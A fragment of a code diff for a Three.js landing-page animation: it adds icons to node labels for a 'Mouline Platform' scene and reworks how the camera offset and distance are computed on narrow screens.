   const m = new THREE.Mesh(nodeGeo, nodeMat);
   m.position.set(SX, s.y, s.z);
   world.add(m); s.mesh = m;
-  addLabel(s.name, m, "src", -1);
+  addLabel(s.name, m, "src", -1, s.icon);
 });
 DST.forEach((d) => {
   const m = new THREE.LineSegments(dstEdges, new THREE.LineBasicMaterial({ color: INK }));
   m.position.set(DX, d.y, d.z);
   world.add(m); d.mesh = m;
-  addLabel(d.name, m, "dst", 1);
+  addLabel(d.name, m, "dst", 1, d.icon);
 });
 const planeAnchor = new THREE.Object3D(); planeAnchor.position.set(0, PH / 2 + 0.45, 0); world.add(planeAnchor);
 addLabel("Mouline Platform", planeAnchor, "plane", 0);
@@ -1102,13 +1412,22 @@ function resize() {
   const w = canvas.clientWidth, h = canvas.clientHeight;
   renderer.setSize(w, h, false);
   camera.aspect = w / h;
-  const narrow = w < 760;
+  const narrow = innerWidth < 760;
   camera.fov = narrow ? 48 : 30;
   camera.updateProjectionMatrix();
-  // shift the rendered view so the scene sits right of the headline (below it on phones)
-  if (narrow) camera.setViewOffset(w, h, 0, -h * 0.3, w, h);
-  else camera.setViewOffset(w, h, -w * 0.23, -h * 0.03, w, h);
-  DIST = narrow ? 52 : 35.5;
+  // shift the rendered view so the scene sits right of the headline, or on phones
+  // centred in the slot reserved for it between the copy and the log strip
+  if (narrow) {
+    const sp = document.getElementById("hero-space").getBoundingClientRect();
+    const cv = canvas.getBoundingClientRect();
+    const cy = sp.top - cv.top + sp.height / 2;
+    camera.setViewOffset(w, h, 0, h / 2 - cy, w, h);
+    const k = 2 * Math.tan(THREE.MathUtils.degToRad(camera.fov / 2));
+    DIST = Math.max((8.2 * h) / (k * sp.height), (14 * h) / (k * w));
+  } else {
+    camera.setViewOffset(w, h, -w * 0.23, -h * 0.03, w, h);
+    DIST = 35.5;
+  }
   labelsEl.classList.toggle("narrow", narrow);
 }
 let DIST = 29;
